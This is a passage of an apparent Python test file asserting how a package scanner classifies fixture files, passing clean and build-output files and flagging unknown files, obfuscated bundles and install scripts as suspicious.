    assert by_file["clean.js"].status == Status.EXPECTED
    assert by_file["clean.js"].reason == "matched"

    # Legitimate matched build output is EXPECTED / build-output
    assert by_file["dist/bundle.min.js"].status == Status.EXPECTED
    assert by_file["dist/bundle.min.js"].reason == "build-output"
    assert by_file["dist/bundle.min.js"].snippet is None
    assert by_file["dist/bundle.min.js"].line is None

    # Unmatched unknown file remains SUSPICIOUS / unknown-file
    assert by_file["dist/evil.js"].status == Status.SUSPICIOUS
    assert by_file["dist/evil.js"].reason == "unknown-file"

    # Obfuscated build output remains SUSPICIOUS (not reclassified as build-output)
    assert by_file["dist/obf.min.js"].status == Status.SUSPICIOUS
    assert by_file["dist/obf.min.js"].reason != "build-output"

    # Install script is SUSPICIOUS / install-script
    assert by_file["package.json"].status == Status.SUSPICIOUS
    assert by_file["package.json"].reason == "install-script"
